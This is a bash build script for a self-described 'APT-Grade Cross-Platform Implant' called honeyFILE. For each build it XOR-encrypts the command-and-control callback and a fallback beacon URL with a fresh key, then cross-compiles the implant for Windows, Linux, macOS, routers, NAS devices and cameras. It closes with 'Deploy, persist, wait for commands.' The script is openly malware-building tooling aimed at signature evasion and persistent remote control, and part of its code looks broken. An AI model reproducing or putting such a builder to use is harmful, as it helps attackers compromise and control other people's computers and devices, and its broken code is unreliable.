#!/bin/bash
# honeyFILE Builder — Cross-compile for every platform
# Polymorphic: each build produces different XOR keys, different hashes.
# Usage: ./build.sh [callback_url] [level] [name]
set -e

CALLBACK="${1:-https://127.0.0.1:9999/ingest}"
LEVEL="${2:-3}"
NAME="${3:-honeyfile}"
OUT="build"

echo ""
echo "  ╔══════════════════════════════════════════╗"
echo "  ║     HONEYFILE BUILDER                   ║"
echo "  ║     APT-Grade Cross-Platform Implant     ║"
echo "  ╚══════════════════════════════════════════╝"
echo ""
echo "  Callback: $CALLBACK"
echo "  Level:    $LEVEL"
echo "  Name:     $NAME"
echo ""

# Generate XOR key and encrypt all config strings
python3 > /tmp/honeyfile_vars.sh << 'PYEOF'
import random, sys

xor_key = bytes([random.randint(1, 255) for _ in range(32)])

def encrypt(s):
    data = s.encode()
    return bytes([data[i] ^ xor_key[i % len(xor_key)] for i in range(len(data))])

def format_bytes(b):
    return '{' + ','.join(f'0x{x:02x}' for x in b) + '}'

cb = sys.argv[1]
lv = sys.argv[2]
nm = sys.argv[3]
fb = "https://fallback.example.com/beacon"

print(f'KEY_LIT={format_bytes(xor_key)}')
print(f'CB_ENC={format_bytes(encrypt(cb))}')
print(f'LV_ENC={format_bytes(encrypt(lv))}')
print(f'NM_ENC={format_bytes(encrypt(nm))}')
print(f'FB_ENC={format_bytes(encrypt(fb))}')
print(f'XOR_HEX={xor_key.hex()[:16]}')
PYEOF "$CALLBACK" "$LEVEL" "$NAME"

source /tmp/honeyfile_vars.sh
echo "  XOR key:  $XOR_HEX"
echo ""

rm -rf "$OUT"
mkdir -p "$OUT"

build() {
    local GOOS="$1"
    local GOARCH="$2"
    local GOARM="$3"
    local EXT="$4"
    local LABEL="$5"
    local BIN="honeyfile_${GOOS}_${GOARCH}${GOARM}${EXT}"
    local TMP="/tmp/honeyfile_build_${GOOS}_${GOARCH}${GOARM}.go"

    sed "s|{CALLBACK_ENC}|${CB_ENC}|g;
         s|{LEVEL_ENC}|${LV_ENC}|g;
         s|{NAME_ENC}|${NM_ENC}|g;
         s|{XOR_KEY}|${KEY_LIT}|g;
         s|{FALLBACK_ENC}|${FB_ENC}|g" main.go > "$TMP"

    GOOS="$GOOS" GOARCH="$GOARCH" GOARM="$GOARM" \
        go build -ldflags="-s -w" -o "${OUT}/${BIN}" "$TMP" 2>/dev/null

    local SIZE=0
    [ -f "${OUT}/${BIN}" ] && SIZE=$(stat -c%s "${OUT}/${BIN}" 2>/dev/null || echo 0)

    if [ "$SIZE" -gt 0 ] 2>/dev/null; then
        echo "  [✓] $LABEL ($(echo "scale=1; $SIZE/1024" | bc 2>/dev/null)KB)"
    else
        echo "  [✗] $LABEL"
    fi

    rm -f "$TMP"
}

echo "  Building..."
echo ""

build windows amd64 "" ".exe" "Windows x64"
build windows 386   "" ".exe" "Windows x86"
build linux amd64   "" ""     "Linux x64"
build linux 386     "" ""     "Linux x86"
build linux arm64   "" ""     "Linux ARM64"
build linux arm     "5" ""    "Linux ARMv5 (routers/NAS)"
build linux arm     "6" ""    "Linux ARMv6 (Pi Zero)"
build linux arm     "7" ""    "Linux ARMv7 (Pi 2/3)"
build linux mips    "" ""     "Linux MIPS (routers)"
build linux mipsle  "" ""     "Linux MIPSle (cameras)"
build darwin amd64  "" ""     "macOS Intel"
build darwin arm64  "" ""     "macOS Apple Silicon"

echo ""
echo "────────────────────────────────────────────"
echo "  Build complete: $(ls $OUT/* 2>/dev/null | wc -l) binaries"
echo ""

ls -1 "$OUT"/* 2>/dev/null | while read f; do
    S=$(stat -c%s "$f" 2>/dev/null || echo 0)
    echo "    $(basename $f) ($(echo "scale=1; $S/1024" | bc 2>/dev/null || echo $S)KB)"
done

echo ""
echo "  All strings XOR-encrypted at rest."
echo "  Polymorphic key per build."
echo "  Deploy, persist, wait for commands."
echo ""

rm -f /tmp/honeyfile_vars.sh
